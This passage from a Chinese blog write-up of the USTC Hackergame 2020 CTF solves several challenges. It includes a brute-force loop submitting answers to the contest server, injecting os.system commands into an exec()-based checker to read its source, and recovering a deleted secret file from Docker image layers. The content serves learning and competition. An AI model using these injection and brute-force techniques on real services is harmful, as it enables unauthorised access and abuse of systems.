flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span 